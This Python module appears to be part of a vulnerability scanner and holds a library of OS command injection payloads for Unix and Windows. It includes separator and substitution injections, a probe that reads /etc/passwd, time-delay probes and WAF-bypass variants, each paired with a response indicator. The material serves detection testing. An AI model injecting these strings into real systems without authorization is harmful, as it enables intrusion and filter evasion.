"""
OS Command Injection Payloads

Collection of payloads for detecting command injection vulnerabilities
across Unix/Linux, Windows, and cross-platform contexts.
"""

from dataclasses import dataclass
from typing import List


@dataclass
class CMDIPayload:
    """Command injection payload."""
    payload: str
    technique: str
    description: str
    waf_bypass: bool
    risk_indicator: str  # What to look for in response
    platform: str  # unix|windows|cross-platform


def get_cmdi_payloads() -> List[CMDIPayload]:
    """Get all command injection payloads."""

    payloads = []

    # ==== UNIX/LINUX PAYLOADS ====

    # Semicolon separator
    payloads.append(CMDIPayload(
        payload="; id",
        technique="semicolon",
        description="Basic command separator",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload="; cat /etc/passwd",
        technique="semicolon",
        description="Read passwd file",
        waf_bypass=False,
        risk_indicator="root:x:0:0",
        platform="unix"
    ))

    # Pipe operator
    payloads.append(CMDIPayload(
        payload="| id",
        technique="pipe",
        description="Pipe to id command",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload="| whoami",
        technique="pipe",
        description="Pipe to whoami",
        waf_bypass=False,
        risk_indicator="root|www-data|apache",
        platform="unix"
    ))

    # Backticks
    payloads.append(CMDIPayload(
        payload="`id`",
        technique="backtick",
        description="Backtick command substitution",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload="`whoami`",
        technique="backtick",
        description="Backtick whoami",
        waf_bypass=False,
        risk_indicator="root|www-data|apache",
        platform="unix"
    ))

    # Command substitution $()
    payloads.append(CMDIPayload(
        payload="$(id)",
        technique="command_substitution",
        description="Command substitution syntax",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload="$(uname -a)",
        technique="command_substitution",
        description="Get system info",
        waf_bypass=False,
        risk_indicator="Linux|GNU",
        platform="unix"
    ))

    # AND operator
    payloads.append(CMDIPayload(
        payload="&& id",
        technique="and_operator",
        description="Conditional execution",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    # OR operator
    payloads.append(CMDIPayload(
        payload="|| id",
        technique="or_operator",
        description="Alternative execution",
        waf_bypass=False,
        risk_indicator="uid=",
        platform="unix"
    ))

    # Newline injection
    payloads.append(CMDIPayload(
        payload="\nid\n",
        technique="newline",
        description="Newline separator",
        waf_bypass=True,
        risk_indicator="uid=",
        platform="unix"
    ))

    # ==== WINDOWS PAYLOADS ====

    # Windows command separator
    payloads.append(CMDIPayload(
        payload="& whoami",
        technique="ampersand",
        description="Windows command separator",
        waf_bypass=False,
        risk_indicator="\\",
        platform="windows"
    ))

    payloads.append(CMDIPayload(
        payload="| whoami",
        technique="pipe",
        description="Windows pipe operator",
        waf_bypass=False,
        risk_indicator="\\",
        platform="windows"
    ))

    payloads.append(CMDIPayload(
        payload="& ipconfig",
        technique="ampersand",
        description="Get network config",
        waf_bypass=False,
        risk_indicator="IPv4 Address",
        platform="windows"
    ))

    # ==== CROSS-PLATFORM PAYLOADS ====

    # Time-based detection (sleep/ping)
    payloads.append(CMDIPayload(
        payload="; sleep 5",
        technique="time_based",
        description="Unix time delay",
        waf_bypass=False,
        risk_indicator="delay_5_seconds",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload="& timeout /t 5",
        technique="time_based",
        description="Windows time delay",
        waf_bypass=False,
        risk_indicator="delay_5_seconds",
        platform="windows"
    ))

    payloads.append(CMDIPayload(
        payload="| ping -c 5 127.0.0.1",
        technique="time_based",
        description="Unix ping delay",
        waf_bypass=False,
        risk_indicator="delay_5_seconds",
        platform="unix"
    ))

    # WAF bypass variations
    payloads.append(CMDIPayload(
        payload=";{id,}",
        technique="brace_expansion",
        description="Bash brace expansion bypass",
        waf_bypass=True,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload=";i\\d",
        technique="backslash_escape",
        description="Backslash escape bypass",
        waf_bypass=True,
        risk_indicator="uid=",
        platform="unix"
    ))

    payloads.append(CMDIPayload(
        payload=";$IFS$9id",
        technique="ifs_bypass",
        description="IFS variable bypass",
        waf_bypass=True,
        risk_indicator="uid=",
        platform="unix"
    ))

    return payloads


def get_time_based_payloads() -> List[CMDIPayload]:
    """Get only time-based detection payloads."""
    all_payloads = get_cmdi_payloads()
    return [p for p in all_payloads if p.technique == 'time_based']


def get_platform_payloads(platform: str) -> List[CMDIPayload]:
    """
    Get payloads for a specific platform.

    Args:
        platform: 'unix', 'windows', or 'cross-platform'
    """
    all_payloads = get_cmdi_payloads()
    return [p for p in all_payloads if p.platform == platform or p.platform == 'cross-platform']
